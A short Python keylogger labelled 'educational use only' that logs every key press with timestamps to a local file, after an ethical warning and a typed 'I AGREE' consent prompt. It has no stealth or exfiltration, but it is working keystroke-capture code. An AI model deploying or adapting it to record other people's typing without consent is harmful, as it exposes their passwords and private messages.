import keyboard
import time
from datetime import datetime
import sys
import os

# Ethical safeguards
def display_warning():
    print("""
    ⚠️ ETHICAL WARNING ⚠️
    This keylogger is for educational purposes only.
    Using this on computers without explicit owner permission is:
    - Unethical
    - Likely illegal
    - A violation of privacy
    
    By continuing, you confirm:
    1. You own this computer or have owner permission
    2. You understand the legal implications
    3. You won't use this for malicious purposes
    """)
    consent = input("Type 'I AGREE' to continue: ")
    if consent.strip().upper() != "I AGREE":
        print("Exiting program...")
        sys.exit(0)

def get_log_path():
    """Get path for log file with user confirmation"""
    default_path = os.path.join(os.path.expanduser('~'), 'keystrokes.log')
    print(f"\nLog file will be saved to: {default_path}")
    change = input("Change path? (y/n): ").lower()
    
    if change == 'y':
        new_path = input("Enter full path for log file: ")
        return new_path
    return default_path

def on_key_press(event):
    """Callback function for key press events"""
    with open(log_path, "a", encoding='utf-8') as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {event.name}\n"
        f.write(log_entry)

def main():
    global log_path
    display_warning()
    log_path = get_log_path()
    
    print("\nKeylogger started (Educational Use Only)")
    print("Press F12 to stop logging...")
    print(f"Logging to: {log_path}")
    
    keyboard.on_press(on_key_press)
    keyboard.wait('f12')  # Stop on F12 press
    
    print("\nKeylogging stopped. Ethical reminder:")
    print("Delete the log file if it contains sensitive information.")
    print(f"Log file location: {log_path}")

if __name__ == "__main__":
    main()